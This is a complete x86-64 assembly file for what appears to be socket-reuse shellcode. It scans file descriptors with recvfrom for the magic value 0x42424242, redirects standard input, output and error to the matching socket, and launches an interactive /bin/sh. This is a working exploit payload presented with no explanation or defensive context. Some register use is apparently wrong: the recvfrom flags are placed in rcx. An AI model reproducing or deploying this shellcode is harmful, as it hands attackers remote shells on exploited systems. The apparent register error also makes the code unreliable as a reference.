BITS 64
section .text

	global _start

_start:
	call start
	db "/bin/sh", 0, 0
	db "-i", 0, 0, 0

start:
	xor rdi, rdi
	xor rax, rax
	inc rax

	sub rsp, 8
	mov dword [rsp], 0
	mov rsi, rsp
	mov rdx, 4
	xor r8, r8
	xor r9, r9	

	jmp check_fd_loop_end
check_fd_loop_start:

	dec dil
	mov rcx, 64		; MSG_DONTWAIT
	mov rax, 45
	syscall			; recvfrom(fd, buf, len, flags, NULL, 0));
	
check_fd_loop_end:
	cmp dword [rsp], 0x42424242
	jne check_fd_loop_start

	add rsp, 8
	mov rsi, 3
dup_loop:
	mov rax, 33
	dec rsi
	syscall
	test rsi, rsi
	jnz dup_loop

	mov rdi, [rsp]
	lea rax, [rdi + 9]
	mov [rsp + 8], rax
	lea rsi, [rsp]
	mov qword [rsp + 0x10], 0
	mov rdx, 0
	mov rax, 59
	syscall
